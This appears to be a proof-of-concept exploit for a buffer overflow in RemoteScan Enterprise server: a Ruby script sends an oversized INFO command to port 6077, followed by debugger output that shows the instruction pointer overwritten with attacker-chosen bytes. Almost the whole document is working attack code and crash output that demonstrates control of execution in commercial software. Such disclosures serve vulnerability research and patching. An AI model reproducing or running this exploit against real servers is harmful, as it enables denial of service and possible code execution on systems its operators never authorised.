#!/usr/bin/env ruby
# RemoteScan Enterprise (RemoteScanServer.exe) Buffer Overflow.
require 'rex'

sock = Rex::Socket::Tcp.create('PeerHost'  => target_here, 'PeerPort'  => 6077)

buff = Rex::Text.pattern_create(2024)
buff[204,4] = [0x41414141].pack('V')
buff[212,4] = [0x42baad].pack('V')

info = "INFO \"#{buff}\" \"ping|ping|ping|ping\""
sock.write(info + "\r\n")
res = sock.get_once
__END__
ance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=01435fe8 ecx=02d7e214 edx=02d7e224 esi=0043c9e8 edi=00446470
eip=41414141 esp=02d7e280 ebp=37674136 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297
41414141 ??              ???
0:007> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
02d7e27c 68413967 0042baad 02d7faf0 02d7fc3c 0x41414141
02d7e280 0042baad 02d7faf0 02d7fc3c 00446958 0x68413967
02d7e284 02d7faf0 02d7fc3c 00446958 00000000 image00400000+0x2baad
02d7e288 02d7fc3c 00446958 00000000 00000000 0x2d7faf0
02d7faf0 02d80048 00000078 01435fe8 014360e0 0x2d7fc3c
00000000 00000000 00000000 00000000 00000000 0x2d80048
0:007> lmvm image00400000
start    end        module name
00400000 00493000   image00400000 C (no symbols)           
    Loaded symbol image file: C:\Program Files\RemoteScan Server\RemoteScanServer.exe
    Image path: image00400000
    Image name: image00400000
    Timestamp:        Thu Jul 06 10:49:26 2017 (595E6A16)
    CheckSum:         00000000
    ImageSize:        00093000
    File version:     10.659.0.0
    Product version:  10.659.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Quest Software Inc.
    ProductName:      RemoteScan Server
    InternalName:     RemoteScan Server
    OriginalFilename: RemoteScanServer.exe
    ProductVersion:   10, 659, 0, 0
    FileVersion:      10, 659, 0, 0
    PrivateBuild:     10, 659, 0, 0
    SpecialBuild:     10, 659, 0, 0
    FileDescription:  RemoteScan Server
    LegalCopyright:   Copyright Â© ^Y
    LegalTrademarks:  RemoteScan
    Comments:         To allow the sharing of scanners and scanning in Terminal Services or Citrix

